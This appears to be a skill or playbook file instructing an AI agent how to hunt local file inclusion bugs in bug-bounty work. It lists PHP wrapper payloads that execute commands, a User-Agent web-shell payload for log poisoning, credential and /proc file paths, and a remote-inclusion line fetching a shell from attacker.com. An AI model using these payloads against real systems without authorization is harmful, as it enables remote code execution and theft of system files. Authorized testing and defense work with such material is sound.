---
name: hunt-lfi
description: Local file inclusion — PHP wrappers, log poisoning, /proc tricks, RFI fallback.
keywords: [lfi, local file inclusion, rfi, php filter, php wrapper, /proc/self/environ, log poisoning]
---

# hunt-lfi

## Triggers

"lfi", "rfi", "file inclusion", "include", "require", "php://filter".

## Phase 1 — confirm inclusion (not just read)

LFI = the file is **executed** (PHP, JSP) in addition to being read.
Path traversal alone reads only. To confirm execution:

```
?page=/etc/passwd      → if `<?xml-stylesheet` or `root:x:` appears
                         in response, just file read
?page=php://filter/convert.base64-encode/resource=index.php
                       → if you get base64-encoded source, it's
                         execution context (PHP include)
```

## Phase 2 — PHP wrappers

```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=index.php
php://input                    (with POST body containing <?php ?>)
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id                    (rare; requires expect ext)
phar://uploads/poc.phar.png   (see hunt-deserialization)
zip://uploads/poc.zip#shell.php
```

## Phase 3 — log poisoning

If LFI is read-only but you can write to a log file the include
reaches:

- Apache access log: `/var/log/apache2/access.log` — write payload
  via User-Agent: `<?php system($_GET['c']); ?>`
- Session file: `/var/lib/php/sessions/sess_<id>` — write into
  session value
- Email file: `/var/mail/<user>` — send mail with PHP payload to
  the local user

Then include the log → PHP executes the embedded payload.

## Phase 4 — /proc tricks

```
/proc/self/environ        (CGI environment vars — PHP-CGI specifically)
/proc/self/cmdline
/proc/self/fd/0..N        (open file descriptors — sometimes log files)
/proc/<pid>/cwd/...
```

## Phase 5 — Windows equivalents

- `C:\xampp\apache\logs\access.log`
- `C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log`
- `\Windows\System32\config\SAM` (rarely readable)

## Phase 6 — RFI (remote file inclusion)

When `allow_url_include = On` (rare in 2026):

```
?page=https://attacker.com/shell.txt
```

Or modern SSRF-adjacent: webhook URLs interpreted as include paths.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2024-4577 (PHP-CGI on Windows) | Best Fit chars → argv injection → LFI/RCE |
| Many WordPress plugin advisories | `?file=` LFI weekly |
| H1 #1057296 | Phar LFI via image upload |

## Never-submit fallbacks

- LFI on PHP < 8 with `null byte` only on file_get_contents — DOWNGRADE
  (path traversal, not inclusion)
- LFI to file that contains only public data → DOWNGRADE

## See also

- `hunt-path-traversal` — read-only equivalent
- `hunt-file-upload` — phar / log poisoning vector
- `hunt-deserialization` — phar
